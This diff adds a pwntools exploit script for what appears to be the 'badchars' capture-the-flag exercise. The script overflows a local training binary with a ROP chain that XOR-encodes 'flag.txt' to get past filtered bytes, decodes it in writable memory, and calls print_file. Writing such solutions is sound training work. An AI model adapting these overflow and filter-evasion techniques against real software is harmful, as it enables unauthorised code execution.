@@ -1,0 +1,36 @@
+#!/usr/bin/python3
+from pwn import *
+
+binary = ELF("./badchars")
+rop = ROP(binary)
+bss = 0x601038
+print_file = binary.symbols['print_file']
+pop_r12_r13_r14_r15 = 0x40069c
+mov_r13_r12 = 0x400634
+xor_r15_r14 = 0x400628
+pop_rdi = 0x4006a3
+badchars = [ord('x'), ord('g'), ord('a'), ord('.')]
+original = b"flag.txt"
+encoded = bytes([b ^ 2 for b in original])
+rop_chain = []
+for i in range(0, len(encoded), 8):
+    chunk = encoded[i:i+8].ljust(8, b"\x00")
+    rop_chain.extend([
+        pop_r12_r13_r14_r15,
+        u64(chunk),
+        bss + i,
+        0, 0,
+        mov_r13_r12
+    ])
+for i in range(len(encoded)):
+    rop_chain.extend([
+        pop_r12_r13_r14_r15,
+        0, 0, 2, bss + i,
+        xor_r15_r14
+    ])
+rop_chain.extend([pop_rdi, bss, print_file])
+padding = b"A" * 40
+payload = padding + b"".join(p64(r) for r in rop_chain)
+p = process("./badchars")
+p.sendline(payload)
+p.interactive()
